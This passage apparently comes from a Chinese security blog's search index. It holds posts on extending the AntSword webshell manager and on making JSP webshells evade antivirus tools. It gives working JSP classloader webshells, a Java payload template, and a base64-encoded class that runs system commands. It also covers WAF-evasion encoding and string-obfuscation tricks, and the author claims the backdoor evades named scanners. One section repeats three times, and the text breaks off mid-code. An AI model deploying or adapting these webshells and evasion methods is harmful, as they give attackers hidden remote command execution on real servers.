解决方法就是把两个函数换换位置就好了。 换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。 把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。 突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。 经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。 原因为什么呢？ 因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。 但是经过测试php类型会正常的根据用户的字符类型来base64编码。 emmmm，玄学问题。 最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。 2.3.3 模板设计Shell模板 \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! class U extends ClassLoader{ U(ClassLoader c){ super(c); } public Class g(byte []b){ return super.defineClass(b,0,b.length); } } BASE64Decoder decoder=new sun.misc.BASE64Decoder(); %\u003e \u003c% String cls=request.getParameter(\"ant\"); if(cls!=null){ new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); } %\u003e 压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。 \u003c%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%\u003e\u003c% String cls=request.getParameter(\"ant\");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%\u003e Payload模板 其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。 注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。 import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.jsp.PageContext; import java.io.ByteArrayOutputStream; public class Demo { public String encoder; public String cs; @Override public boolean equals(Object obj) { PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(\"encoder\")!=null?request.getParameter(\"encoder\"):\"\"; cs=request.getParameter(\"charset\")!=null?request.getParameter(\"charset\"):\"UTF-8\"; StringBuffer output = new StringBuffer(\"\"); StringBuffer sb = new StringBuffer(\"\"); try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(\"var0\")+\"\")); String var1 = EC(decode(request.getParameter(\"var1\")+\"\")); String var2 = EC(decode(request.getParameter(\"var2\")+\"\")); String var3 = EC(decode(request.getParameter(\"var3\")+\"\")); output.append(\"-\u003e\" + \"|\"); sb.append(func(var1)); output.append(sb.toString()); output.append(\"|\" + \"\u003c-\"); page.getOut().print(output.toString()); } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } return true; } String EC(String s) throws Exception { if(encoder.equals(\"hex\")) return s; return new String(s.getBytes(), cs); } String decode(String str) throws Exception{ if(encoder.equals(\"hex\")){ if(str==\"null\"||str.equals(\"null\")){ return \"\"; } String hexString = \"0123456789ABCDEF\"; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = \"\"; for (int i = 0; i \u003c str.length(); i += 2){ ss = ss + (hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\"; baos.write((hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1)))); } return baos.toString(\"UTF-8\"); }else if(encoder.equals(\"base64\")){ byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,\"UTF-8\"); } return str; } String func (Stri","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#模板设计"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。 编译命令 javac -cp \"D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar\" Test.java 保存编译后的class字节码 base64 -w 0 Test.class \u003e Test.txt 2.3.2 乱码问题的解决然后是让人头秃的乱码问题。 众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。 在php版的custom中对于编码是这样处理的： 其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。 decode函数是对字符串进行解码，比如说base64、hex这种。 但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。 调试了一下果然会乱码，然后报找不到路径的错误。 解决方法就是把两个函数换换位置就好了。 换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。 把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。 突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。 经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。 原因为什么呢？ 因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。 但是经过测试php类型会正常的根据用户的字符类型来base64编码。 emmmm，玄学问题。 最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。 2.3.3 模板设计Shell模板 \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! class U extends ClassLoader{ U(ClassLoader c){ super(c); } public Class g(byte []b){ return super.defineClass(b,0,b.length); } } BASE64Decoder decoder=new sun.misc.BASE64Decoder(); %\u003e \u003c% String cls=request.getParameter(\"ant\"); if(cls!=null){ new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); } %\u003e 压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。 \u003c%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%\u003e\u003c% String cls=request.getParameter(\"ant\");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%\u003e Payload模板 其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。 注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。 import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.jsp.PageContext; import java.io.ByteArrayOutputStream; public class Demo { public String encoder; public String cs; @Override public boolean equals(Object obj) { PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(\"encoder\")!=null?request.getParameter(\"encoder\"):\"\"; cs=request.getParameter(\"charset\")!=null?request.getParameter(\"charset\"):\"UTF-8\"; StringBuffer output = new StringBuffer(\"\"); StringBuffer sb = new StringBuffer(\"\"); try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(\"var0\")+\"\")); String var1 = EC(decode(request.getParameter(\"var1\")+\"\")); String var2 = EC(decode(request.getParameter(\"var2\")+\"\")); String var3 = EC(decode(request.getParameter(\"var3\")+\"\")); output.append(\"-\u003e\" + \"|\"); sb.append(func(var1)); output.append(sb.toString()); output.append(\"|\" + \"\u003c-\"); page.getOut().print(output.toString()); } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } return true; } String EC(String s) throws Exception { if(encoder.equals(\"hex\")) return s; return new String(s.getBytes(), cs); } String decode(String str) throws Exception{ if(encoder.equals(\"hex\")){ if(str==\"null\"||str.equals(\"null\")){ return \"\"; } String hexString = \"0123456789ABCDEF\"; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = \"\"; for (int i = 0; i \u003c str.length(); i += 2){ ss = ss + (hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\"; baos.write((hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1)))); } return baos.toString(\"UTF-8\"); }else if(encoder.equals(\"base64\")){ byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,\"UTF-8\"); } return str; } String func (Stri","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#蚁剑客户端修改"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。 编译命令 javac -cp \"D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar\" Test.java 保存编译后的class字节码 base64 -w 0 Test.class \u003e Test.txt 2.3.2 乱码问题的解决然后是让人头秃的乱码问题。 众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。 在php版的custom中对于编码是这样处理的： 其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。 decode函数是对字符串进行解码，比如说base64、hex这种。 但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。 调试了一下果然会乱码，然后报找不到路径的错误。 解决方法就是把两个函数换换位置就好了。 换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。 把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。 突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。 经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。 原因为什么呢？ 因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。 但是经过测试php类型会正常的根据用户的字符类型来base64编码。 emmmm，玄学问题。 最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。 2.3.3 模板设计Shell模板 \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! class U extends ClassLoader{ U(ClassLoader c){ super(c); } public Class g(byte []b){ return super.defineClass(b,0,b.length); } } BASE64Decoder decoder=new sun.misc.BASE64Decoder(); %\u003e \u003c% String cls=request.getParameter(\"ant\"); if(cls!=null){ new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); } %\u003e 压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。 \u003c%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%\u003e\u003c% String cls=request.getParameter(\"ant\");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%\u003e Payload模板 其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。 注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。 import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.jsp.PageContext; import java.io.ByteArrayOutputStream; public class Demo { public String encoder; public String cs; @Override public boolean equals(Object obj) { PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(\"encoder\")!=null?request.getParameter(\"encoder\"):\"\"; cs=request.getParameter(\"charset\")!=null?request.getParameter(\"charset\"):\"UTF-8\"; StringBuffer output = new StringBuffer(\"\"); StringBuffer sb = new StringBuffer(\"\"); try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(\"var0\")+\"\")); String var1 = EC(decode(request.getParameter(\"var1\")+\"\")); String var2 = EC(decode(request.getParameter(\"var2\")+\"\")); String var3 = EC(decode(request.getParameter(\"var3\")+\"\")); output.append(\"-\u003e\" + \"|\"); sb.append(func(var1)); output.append(sb.toString()); output.append(\"|\" + \"\u003c-\"); page.getOut().print(output.toString()); } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } return true; } String EC(String s) throws Exception { if(encoder.equals(\"hex\")) return s; return new String(s.getBytes(), cs); } String decode(String str) throws Exception{ if(encoder.equals(\"hex\")){ if(str==\"null\"||str.equals(\"null\")){ return \"\"; } String hexString = \"0123456789ABCDEF\"; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = \"\"; for (int i = 0; i \u003c str.length(); i += 2){ ss = ss + (hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\"; baos.write((hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1)))); } return baos.toString(\"UTF-8\"); }else if(encoder.equals(\"base64\")){ byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,\"UTF-8\"); } return str; } String func (Stri","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#实现效果"},{"categories":["技术文章"],"content":"\r3 最后有同学可能会问为什么不写回显信息编码函数呢？ 因为在目前方式下特征太明显了，根本不需要根据回显信息就可以识别。写了后还会导致payload很长，并且还会增加一个decoder=xxx的特征，所以就没加。同时传递的encoder=xxx也没有编码，不管怎么编码都是WAF加一条规则的事情。 目前只是处在能用的阶段，无法做到随机变量名等操作，存在很多的硬性特征。在找到有效的解决方法前，本功能可能并不会合并到蚁剑主体中。 因为payload实在是太多了，所以我就单独开了一个项目来存放源码：JspForAntSword 如果有什么好的建议欢迎提pr 修改后的蚁剑(2.1.x分支)： https://github.com/yzddmr6/antSword/tree/v2.1.x 感谢@rebeyond大佬的提醒，同时也感谢@Medici.yan表哥这几天一直跟我交流那么多。 深刻的体会到独学则无友。如果有什么写的不对的地方希望师傅们提出，希望大佬们能多带带弟弟QAQ。 ","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:3:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#最后"},{"categories":["技术文章"],"content":"\r1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。 不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。 蚁剑改造计划之实现动态秘钥编码器解码器 蚁剑改造计划之基于随机Cookie的动态秘钥编码器 蚁剑改造计划之增加垃圾数据 ","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:1:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:2:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#正文"},{"categories":["技术文章"],"content":"\r2.1 历史遗留问题我在前面几篇文章提到过，蚁剑一直有一个硬伤就是它对于其他参数的处理仅仅是一层base64。这就导致了不管怎么对主payload加密，WAF只要分析到其他的参数就能知道你在做什么。 例如你在执行cmd的时候，就一定会发送一个经过base64编码的cmd字符串，这就留下了一个被WAF识别的特征。 即使是蚁剑编码器仓库中的aes编码器也只是对主payload加了密，防护方在不需要解密主payload的情况下只要看到其他参数传的什么内容就能推测攻击者的行为。 yan表哥曾经在公众号中的WAF拦了蚁剑发送的其它参数时怎么操作文章中给出了一种解决方案。主要思想就是在不修改主payload的情况下，配合客户端额外再把它加密解密一遍。 可以是可以，但是很麻烦，对于普通的shell不具有适用性。 这篇文章的目的就是解决掉这个历史遗留问题。 ","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:2:1","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#历史遗留问题"},{"categories":["技术文章"],"content":"\r2.2 随机化方式的选择想要从根本上解决问题就要修改核心payload，那么怎么改呢？ 以前师傅们的文章提出过两个方法，一种是把其他参数base64两次，还有一种是在其他参数前面加两个随机字符，然后主payload中再把它给substr截掉，来打乱base64的解码。 如果方法是写死的话，无非只是WAF增加两条规则而已。蚁剑这么有名的项目，一定是防火墙商眼中紧盯的目标。最好的解决办法就是加入一个用户可控的参数，能够让用户自定义修改。这样才有可能最大程度的逃过WAF的流量查杀。 所以本文采用的方法就是在每个第三方参数前，加入用户自定义长度的随机字符串，来打乱base64的解码。 这时，如果WAF不能获得主payload中用户预定义的偏移量，也就无法对其他参数进行解密。此时我们的强加密型编码器才能真正起到作用。 ","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:2:2","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#随机化方式的选择"},{"categories":["技术文章"],"content":"\r2.3 具体实现思路 获取用户预定义前缀偏移量-\u003e修改核心payload模版-\u003e给其他参数前增加随机字符串 前端的话首先写一个text框，来获取用户的输入 在\\source\\core\\base.js中定义randomPrefix变量 在\\source\\modules\\settings\\adefault.js中设置默认值 然后后端就可以通过opts.otherConf[\"random-Prefix\"]来获取用户定义的随机前缀的长度值。 修改模版前要简单了解一下蚁剑对于参数的处理流程 在各类型shell的模版文件中，会定义默认的payload以及他们所需要的参数，还有对于参数的编码方式。 source\\core\\php\\template\\filemanager.js 在获取到模版之后，parseTemplate会对其中的参数进行提取、解析、组合，形成要发送的payload source\\core\\base.js 所以我们要把用户预定义的前缀偏移量传入到两个地方： （1）核心payload模版 （2）其他参数的组合模块 在核心payload中，我们将要修改的偏移量用#randomPrefix#进行标记，到parseTemplate函数组合最终数据包的时候将其替换。 然后定义一个新类型的编码处理器newbase64，在模板中修改对于参数的处理函数。 /** * 增加随机前缀的base64编码 * @param {String} str 字符串 * @return {String} 编码后的字符串 */ newbase64(str) { let randomString=(length)=\u003e{ let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let result = ''; for (let i = length; i \u003e 0; --i) result += chars[Math.floor(Math.random() * chars.length)]; return result; } return randomString(randomPrefix)+Buffer.from(iconv.encode(Buffer.from(str), encode)).toString('base64'); } 修改后的模板长这个样 期间遇到一个小坑，就是无法在format()函数中获取opts的值 后来发现蚁剑中是这样写的 还特意把原来的new this.format给注释掉换成Base.prototype.format的形式，具体原因我也不知道为什么。如果有知道的师傅麻烦告诉我一下。 既然追求刺激，那就贯彻到底，直接把opts传给format函数，然后在format中重新取所需要的变量。 ","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#具体实现"},{"categories":["技术文章"],"content":"\r2.4 测试前缀长度默认为2，可以自行修改，只要不是4的倍数即可(原因自己思考一下)。 可以正常使用 其中prototype为我们传入的第三方参数的值，在这里是要打开目录的绝对路径 prototype=ojRDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3BocE15QWRtaW4v 直接base64解码会是乱码 去掉前两位后我们进行解码则可以得到正确的结果。 ","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:2:4","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#测试"},{"categories":["技术文章"],"content":"\r3 最后偏移两位的效果可能还不是很明显，容易被猜出。但是当前缀长度达到10位以上的时候，就很难分析出最后的结果。 对php类型修改后我在本地测试了主要的13个功能，均可以正常使用。但是由于涉及到修改核心payload，等确定没有bug了再改其他的。 由于我是在父类Base中修改的编码模块，想修改其他类型的shell只需要照葫芦画瓢改一下对应的模版即可。 修改后的项目地址： https://github.com/yzddmr6/antSword/tree/v2.1.x ","date":"2020-03-11","objectID":"/posts/antsword-diy-2/:3:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现其他参数的随机化","uri":"/posts/antsword-diy-2/#最后"},{"categories":["技术文章"],"content":"\r1 前言在上篇文章的最后我提到了可以用类加载实现一个类似php回调函数的后门，在这篇文章里实现了一下，供大家借鉴参考。 ","date":"2020-02-26","objectID":"/posts/jsp-classload-backdoor/:1:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]JSP类加载后门","uri":"/posts/jsp-classload-backdoor/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2020-02-26","objectID":"/posts/jsp-classload-backdoor/:2:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]JSP类加载后门","uri":"/posts/jsp-classload-backdoor/#正文"},{"categories":["技术文章"],"content":"\r2.1 基本原理相当于一个shellcode加载器。客户端只留一个任意类的加载器，然后我们只需要把想要执行的类的二进制字节码传进去就可以了。其实还是冰蝎的思路，但是冰蝎每次执行不同的命令都需要重新编译class，而本文是将要执行的参数通过额外参数传了进去，就不用来回编译了。 我后来想一想觉得蚁剑可以采用这种模式，不需要额外调用jar包来产生payload，直接把payload写死然后额外传参。这样蚁剑中就只需要保留字符串格式的payload就可以了。 ","date":"2020-02-26","objectID":"/posts/jsp-classload-backdoor/:2:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]JSP类加载后门","uri":"/posts/jsp-classload-backdoor/#基本原理"},{"categories":["技术文章"],"content":"\r2.2 具体利用样例中是执行系统命令的payload，你也可以改成别的弹shell之类的payload。 新建Payload.java import java.util.Scanner; public class Payload { public String test(String cmd) throws Exception{ Process e= Runtime.getRuntime().exec(cmd); Scanner s = new Scanner(e.getInputStream()).useDelimiter(\"\\\\A\"); String result = \" \u003cpre\u003e\"; result+= s.hasNext() ? s.next() : \"\"; s.close(); result+=\"\u003c/pre\u003e\"; return result; } } 因为没加包名，手动javac编译一下，然后base64生成的class文件 去掉多余的换行，这就是我们执行命令的payload了，找个记事本保存一下。 yv66vgAAADIATwoAFAAlCgAmACcKACYAKAcAKQoAKgArCgAEACwIAC0KAAQALggALwcAMAoACgAlCgAKADEKAAQAMgoABAAzCAA0CgAKADUKAAQANggANwcAOAcAOQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAR0ZXN0AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwA4BwA6BwA7BwApBwAwAQAKRXhjZXB0aW9ucwcAPAEAClNvdXJjZUZpbGUBAAxQYXlsb2FkLmphdmEMABUAFgcAPQwAPgA/DABAAEEBABFqYXZhL3V0aWwvU2Nhbm5lcgcAOwwAQgBDDAAVAEQBAAJcQQwARQBGAQAFPHByZT4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwARwBIDABJAEoMAEsATAEAAAwATQBMDABOABYBAAY8L3ByZT4BAAdQYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAh0b1N0cmluZwEABWNsb3NlACEAEwAUAAAAAAACAAEAFQAWAAEAFwAAAB0AAQABAAAABSq3AAGxAAAAAQAYAAAABgABAAAAAwABABkAGgACABcAAADLAAMABQAAAF64AAIrtgADTbsABFkstgAFtwAGEge2AAhOEgk6BLsAClm3AAsZBLYADC22AA2ZAAottgAOpwAFEg+2AAy2ABA6BC22ABG7AApZtwALGQS2AAwSErYADLYAEDoEGQSwAAAAAgAYAAAAHgAHAAAABQAIAAYAGQAHAB0ACABBAAkARQAKAFsACwAbAAAANwAC/wA3AAUHABwHAB0HAB4HAB8HAB0AAQcAIP8AAQAFBwAcBwAdBwAeBwAfBwAdAAIHACAHAB0AIQAAAAQAAQAiAAEAIwAAAAIAJA== 客户端cmd.jsp \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! public static class Myloader extends ClassLoader { public Class get(byte[] b) { return super.defineClass(b, 0, b.length); } } %\u003e \u003c% String cmd=request.getParameter(\"cmd\"); String classStr=request.getParameter(\"class\"); if (cmd !=null \u0026 classStr!=null){ BASE64Decoder code=new sun.misc.BASE64Decoder(); Class result=new Myloader().get(code.decodeBuffer(classStr)); out.print(result.getMethod(\"test\",String.class).invoke(result.newInstance(),cmd)); } %\u003e 大体意思就是接收到两个参数，一个是class字节码，一个是要执行的cmd命令。然后用类反射调用payload中的test方法。 可以秒D盾跟scanner 上篇文章中用类反射调用其实还是会被发现，因为只是字符串的简单变形。而类加载的话可以做到客户端都是正常代码，只有payload传过去的时候才会执行恶意命令。并且payload可控，在不改动客户端的情况下，我们可以把payload改成其他想执行的命令，例如远程种马这种。 其他姿势大家自行发挥吧~ ","date":"2020-02-26","objectID":"/posts/jsp-classload-backdoor/:2:2","series":null,"tags":["webshell","免杀"],"title":"[知识星球]JSP类加载后门","uri":"/posts/jsp-classload-backdoor/#具体利用"},{"categories":["技术文章"],"content":"WebShell免杀之JSP","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/"},{"categories":["技术文章"],"content":"\r1 前言其他类型的webshell容易免杀的一个主要原因是有eval函数，能够把我们的加密几层后的payload进行解密然后用eval执行，从而绕过杀软的检测。 然而由于JSP的语法没有所谓的eval函数，不像php等语言那么灵活，变形困难，所以JSP的免杀马比较少，相关的文章也比较少。 能找到的公开文章中，LandGrey大佬的这一篇文章写的非常好，利用Java反射机制和Java类加载机制来构造免杀的JSP后门。 但是文章中部分细节仅为一笔带过，对于没有学过JAVA的同学不太友好。并且这篇文章写在冰蝎出现之前，没有对冰蝎JSPshell免杀的相关内容。所以今天这篇文章就跟大家一起分享一下JSP的免杀姿势。 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:1:0","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#前言"},{"categories":["技术文章"],"content":"\r2 基础知识","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:0","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#基础知识"},{"categories":["技术文章"],"content":"\r2.1 JSP标签在JSP页面中嵌入java代码，首先要了解一下JSP标签的基本知识。 \u003c%@ %\u003e 页面指令，设定页面属性和特征信息 \u003c% %\u003e java代码片段，不能在此声明方法 \u003c%! %\u003e java代码声明，声明全局变量或当前页面的方法 \u003c%= %\u003e Java表达式 ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:1","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#jsp标签"},{"categories":["技术文章"],"content":"\r2.2 JSP中的字符串混淆方式\r2.2.1 ASCII String a=new String(new byte[] { 121, 122, 100, 100, 77, 114, 54 }); System.out.println(\"ASCII: \"+a); 2.2.2 HEX import javax.xml.bind.DatatypeConverter; String b= new String(DatatypeConverter.parseHexBinary(\"797a64644d7236\")); System.out.println(\"HEX: \"+b); 2.2.3 BASE64 import sun.misc.BASE64Decoder; String c = new String(new BASE64Decoder().decodeBuffer(\"eXpkZE1yNg==\")); System.out.println(\"BASE64: \"+c); ","date":"2020-02-01","objectID":"/posts/webshell-bypass-jsp/:2:2","series":null,"tags":["webshell","免杀"],"title":"WebShell免杀之JSP","uri":"/posts/webshell-bypass-jsp/#jsp中的字符串混淆方式"},{"categories":["技术文章"],"content":"\r2.2 JSP中的字符串混淆方式\r2.2.1 ASCII String a=new String(new byte[] { 